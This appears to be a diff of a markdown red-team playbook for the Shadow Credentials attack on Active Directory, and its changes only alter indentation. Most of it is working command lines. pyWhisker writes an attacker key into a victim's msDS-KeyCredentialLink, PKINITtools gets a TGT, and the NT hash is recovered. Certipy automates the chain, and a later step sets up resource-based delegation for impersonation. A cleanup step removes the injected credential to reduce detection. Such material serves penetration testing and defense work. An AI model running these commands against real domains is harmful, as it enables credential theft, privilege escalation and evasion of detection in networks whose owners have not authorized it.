@@ -45,15 +45,15 @@ The technique was published by Elad Shamir (*"Shadow Credentials: Abusing Key Tr
 - A DC running Windows Server 2016+ with PKINIT enabled (domain functional level supporting Key Trust)
 - Network reachability to LDAP (389/636) and Kerberos (88) on a DC
 - Linux attack host with Python 3.8+; install the tooling:
-  ```bash
-  # pyWhisker (from source)
-  git clone https://github.com/ShutdownRepo/pywhisker
-  cd pywhisker && pip install .
-  # Certipy (integrated shadow attack)
-  pipx install certipy-ad
-  # PKINITtools for manual TGT/NT-hash extraction
-  git clone https://github.com/dirkjanm/PKINITtools
-  ```
+ ```bash
+ # pyWhisker (from source)
+ git clone https://github.com/ShutdownRepo/pywhisker
+ cd pywhisker && pip install .
+ # Certipy (integrated shadow attack)
+ pipx install certipy-ad
+ # PKINITtools for manual TGT/NT-hash extraction
+ git clone https://github.com/dirkjanm/PKINITtools
+ ```
 
 ## Objectives
 
@@ -77,7 +77,7 @@ List existing Key Credentials on the target to verify you have the required acce
 
 ```bash
 python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "list"
+ --target "victim" --action "list"
 ```
 
 ### Step 2: Add a Shadow Credential with pyWhisker
@@ -85,13 +85,13 @@ Generate a certificate/key pair and write it into the target's `msDS-KeyCredenti
 
 ```bash
 python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "add" --filename victim_shadow
+ --target "victim" --action "add" --filename victim_shadow
 # Produces victim_shadow.pfx and prints the PFX password
 ```
 Use Kerberos auth instead of a password if you only hold a ticket:
 ```bash
 python3 pywhisker.py -d "corp.local" -u "attacker" -k --no-pass \
-    --target "victim" --action "add" --filename victim_shadow --use-ldaps
+ --target "victim" --action "add" --filename victim_shadow --use-ldaps
 ```
 
 ### Step 3: Request a TGT via PKINIT
@@ -99,8 +99,8 @@ Use the generated PFX with PKINITtools to obtain a Kerberos TGT for the target.
 
 ```bash
 python3 PKINITtools/gettgtpkinit.py \
-    -cert-pfx victim_shadow.pfx -pfx-pass <PFX_PASSWORD> \
-    corp.local/victim victim.ccache
+ -cert-pfx victim_shadow.pfx -pfx-pass <PFX_PASSWORD> \
+ corp.local/victim victim.ccache
 ```
 
 ### Step 4: Recover the NT hash
@@ -117,10 +117,10 @@ Certipy's `shadow auto` performs add → PKINIT → dump hash → cleanup automa
 
 ```bash
 certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'victim'
+ -dc-ip 10.0.0.100 -account 'victim'
 # For a computer account, use the sAMAccountName with trailing $
 certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'WS01$'
+ -dc-ip 10.0.0.100 -account 'WS01$'
 ```
 
 ### Step 6: Use the recovered credential
@@ -140,7 +140,7 @@ When the target is a computer, the recovered key/hash lets you configure Resourc
 ```bash
 # Set RBCD so attacker-controlled SPN can impersonate to WS01$
 impacket-rbcd -delegate-from 'attacker$' -delegate-to 'WS01$' \
-    -action write 'corp.local/attacker:Passw0rd!'
+ -action write 'corp.local/attacker:Passw0rd!'
 ```
 
 ### Step 8: Clean up
@@ -149,10 +149,10 @@ Remove the injected Key Credential to restore the object and reduce detection fo
 ```bash
 # pyWhisker: remove by device-id (printed during add) or clear all you added
 python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "remove" --device-id <DEVICE-ID>
+ --target "victim" --action "remove" --device-id <DEVICE-ID>
 # Certipy shadow auto cleans up automatically; otherwise:
 certipy shadow clear -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'victim'
+ -dc-ip 10.0.0.100 -account 'victim'
 ```
 
 ## Tools and Resources
